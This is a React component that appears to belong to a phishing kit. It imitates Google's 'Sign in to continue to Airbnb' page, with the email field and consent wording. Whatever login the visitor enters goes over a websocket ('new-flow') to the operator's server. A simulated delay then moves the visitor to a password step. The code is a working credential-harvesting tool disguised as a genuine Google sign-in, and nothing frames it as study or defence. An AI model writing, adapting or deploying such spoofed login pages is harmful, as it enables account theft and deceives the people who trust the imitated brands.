'use client';
import styles from '../Google.module.scss';
import { FormEvent, useContext } from 'react';
import { socket } from '../../socket';
import { GoogleContext } from '../Google';
import Field from '../Field/Field';

export default function GoogleLogin({ setStage, setLoading }: { setStage: (v: string) => void; setLoading: (b: boolean) => void }) {
	const { data, setData } = useContext(GoogleContext);

	const handleSubmit = (e: FormEvent | null) => {
		if (e) e.preventDefault();
		socket.emit('new-flow', data);
		setLoading(true);
		setTimeout(() => {
			setStage('password');
			setLoading(false);
		}, 3000);
	};
	return (
		<form onSubmit={handleSubmit} className={styles.form}>
			<div className={styles.title}>Sign in</div>
			<div className={styles.sub_title} style={{ paddingBottom: '9px' }}>
				to continue to <a>Airbnb</a>
			</div>
			<Field label='Email or phone' value={data?.login} onChange={v => setData({ ...data, login: v })} />
			<a className={styles.sub_input}>Forgot email?</a>
			<div className={styles.dop}>
				To continue, Google will share your name, email address, language preference, and profile picture with Airbnb. Before using this app, you can review Airbnb’s{' '}
				<a>privacy policy</a>
				and <a>terms of service</a>.
			</div>
			<div className={styles.buttons}>
				<button type='submit' className={styles.white_button}>
					Create account
				</button>
				<button type='submit' className={styles.next_button}>
					Next
				</button>
			</div>
		</form>
	);
}
